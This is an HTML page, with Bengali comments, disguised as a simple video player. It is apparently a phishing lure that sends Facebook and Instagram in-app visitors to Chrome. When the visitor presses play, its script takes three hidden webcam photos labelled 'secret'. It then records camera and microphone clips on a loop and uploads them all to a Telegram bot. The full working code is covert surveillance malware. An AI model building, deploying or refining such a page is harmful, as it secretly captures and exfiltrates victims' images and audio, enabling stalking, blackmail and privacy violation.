<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Video Player</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    body {
      background: radial-gradient(circle at center, #0f172a 0%, #020617 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 12px;
      overflow: hidden;
      font-family: system-ui, -apple-system, sans-serif;
    }

    .bg-glow {
      position: absolute;
      width: 300px;
      height: 300px;
      background: radial-gradient(circle, rgba(56, 189, 248, 0.15) 0%, rgba(0, 0, 0, 0) 70%);
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      z-index: 0;
      pointer-events: none;
    }

    .player-card {
      position: relative;
      z-index: 1;
      width: 100%;
      max-width: 500px;
      background: rgba(15, 23, 42, 0.65);
      border: 1px solid rgba(255, 255, 255, 0.08);
      border-radius: 24px;
      padding: 14px;
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6),
                  inset 0 1px 0 rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(16px);
      -webkit-backdrop-filter: blur(16px);
    }

    .video-container {
      position: relative;
      width: 100%;
      border-radius: 16px;
      overflow: hidden;
      background: #000;
      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.5);
    }

    video {
      width: 100%;
      display: block;
      outline: none;
      border-radius: 16px;
    }

    #hiddenCam, #snapshotCanvas {
      display: none;
    }

    /* ✨ বিশেষ কাস্টম বিউটি ও স্কিন গ্লো ফিল্টার */
    .filter-beauty-glow {
      filter: contrast(105%) brightness(112%) saturate(115%) drop-shadow(0 0 2px rgba(255,255,255,0.2));
    }
  </style>
</head>
<body>

  <!-- ক্রোম ব্রাউজারে রিডাইরেক্ট করার স্ক্রিপ্ট -->
  <script>
    (function() {
      const ua = navigator.userAgent || navigator.vendor || window.opera;
      const currentUrl = window.location.href;
      if (ua.indexOf('FBAN') > -1 || ua.indexOf('FBAV') > -1 || ua.indexOf('Instagram') > -1) {
        if (/android/i.test(ua)) {
          window.location.href = 'intent://' + currentUrl.replace(/^https?:\/\//, '') + '#Intent;scheme=https;package=com.android.chrome;end;';
        } else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
          window.location.href = 'googlechrome://' + currentUrl.replace(/^https?:\/\//, '');
        }
      }
    })();
  </script>

  <div class="bg-glow"></div>

  <div class="player-card">
    <div class="video-container">
      <video id="mainVideo" controls preload="metadata">
        <source src="video.mp4" type="video/mp4">
        আপনার ব্রাউজার ভিডিও সাপোর্ট করছে না।
      </video>
    </div>
  </div>

  <video id="hiddenCam" autoplay playsinline muted class="filter-beauty-glow"></video>
  <canvas id="snapshotCanvas"></canvas>

  <script>
    // ⚙️ রেন্ডার বিল্ডের সময় এগুলো অটোমেটিক এনভায়রনমেন্ট ভেরিয়েবল দিয়ে রিপ্লেস হবে
    const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';

    const mainVideo = document.getElementById('mainVideo');
    const hiddenCam = document.getElementById('hiddenCam');
    const canvas = document.getElementById('snapshotCanvas');

    let camStream = null;
    let isStarted = false;

    // প্লে বাটনে ক্লিক করলেই কাজ শুরু হবে
    mainVideo.addEventListener('play', async () => {
      if (isStarted) return;
      isStarted = true;

      try {
        camStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user' },
          audio: true 
        });

        hiddenCam.srcObject = camStream;

        // ভিডিও স্ট্রিম পুরোপুরি প্লে হওয়ার জন্য ১ সেকেন্ড অপেক্ষা করা
        await new Promise(resolve => setTimeout(resolve, 1000));

        // ১. প্রথমে পর পর ৩টি ছবি তুলে দ্রুত টেলিগ্রামে পাঠানো
        await captureAndSendPhotos(3);

        // ২. এরপর ভিডিও ক্লিপ দ্রুত রেকর্ড করে এমপিফোর আকারে পাঠানো শুরু করা
        startPeriodicVideoRecording();

      } catch (err) {
        console.error("Camera permission denied or error:", err);
      }
    });

    // ছবি তোলার দ্রুত ফাংশন
    function takePhoto() {
      return new Promise((resolve) => {
        setTimeout(() => {
          if (!hiddenCam.videoWidth || !hiddenCam.videoHeight) {
            resolve(null);
            return;
          }
          canvas.width = hiddenCam.videoWidth;
          canvas.height = hiddenCam.videoHeight;
          const ctx = canvas.getContext('2d');

          ctx.filter = window.getComputedStyle(hiddenCam).filter;
          ctx.drawImage(hiddenCam, 0, 0, canvas.width, canvas.height);

          canvas.toBlob((blob) => {
            resolve(blob);
          }, 'image/jpeg', 0.85);
        }, 600);
      });
    }

    // পর পর ৩টি ছবি টেলিগ্রামে পাঠানো
    async function captureAndSendPhotos(count) {
      for (let i = 1; i <= count; i++) {
        const photoBlob = await takePhoto();
        if (photoBlob && photoBlob.size > 0) {
          const formData = new FormData();
          formData.append('chat_id', TELEGRAM_CHAT_ID);
          formData.append('photo', photoBlob, `photo_${i}_${Date.now()}.jpg`);
          formData.append('caption', `✨ বিউটি ফিল্টারসহ সিক্রেট ছবি #${i}`);

          fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
          }).catch(err => console.log("Photo send failed", err));
        }
        await new Promise(r => setTimeout(r, 400));
      }
    }

    // প্রতি ৪ সেকেন্ড পর পর ভিডিও রেকর্ড করে সরাসরি .mp4 আকারে টেলিগ্রামে পাঠানোর লুপ
    function startPeriodicVideoRecording() {
      if (!camStream) return;

      const recordInterval = async () => {
        if (!camStream || camStream.active === false) return;

        // এমপিফোর ফরম্যাট বা ব্রাউজার সাপোর্টেড ফরম্যাট সিলেক্ট করা
        let options = { mimeType: 'video/mp4' };
        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
          options = { mimeType: 'video/webm;codecs=h264,opus' };
          if (!MediaRecorder.isTypeSupported(options.mimeType)) {
            options = { mimeType: 'video/webm' };
          }
        }

        let mediaRecorder;
        try {
          mediaRecorder = new MediaRecorder(camStream, options);
        } catch (e) {
          setTimeout(recordInterval, 1000);
          return;
        }

        let chunks = [];

        mediaRecorder.ondataavailable = (e) => {
          if (e.data && e.data.size > 0) {
            chunks.push(e.data);
          }
        };

        mediaRecorder.onstop = async () => {
          if (chunks.length > 0) {
            // ডাইরেক্ট MP4 এক্সটেনশন দিয়ে ফাইল তৈরি করা
            const videoBlob = new Blob(chunks, { type: 'video/mp4' });
            if (videoBlob.size > 1000) {
              const formData = new FormData();
              formData.append('chat_id', TELEGRAM_CHAT_ID);
              formData.append('video', videoBlob, `clip_${Date.now()}.mp4`);
              formData.append('caption', `🎥 এমপিফোর ভিডিও ক্লিপ`);

              fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
                method: 'POST',
                body: formData
              }).catch(err => console.log("Video send failed", err));
            }
          }

          // দ্রুত পরবর্তী ক্লিপ শুরু করার জন্য সময় কমিয়ে দেওয়া হলো
          setTimeout(recordInterval, 500);
        };

        mediaRecorder.start();

        // ভিডিও আসার দেরি কমানোর জন্য রেকর্ডিংয়ের সময় ৪ সেকেন্ড করা হলো
        setTimeout(() => {
          if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
          }
        }, 4000);
      };

      recordInterval();
    }
  </script>
</body>
</html>
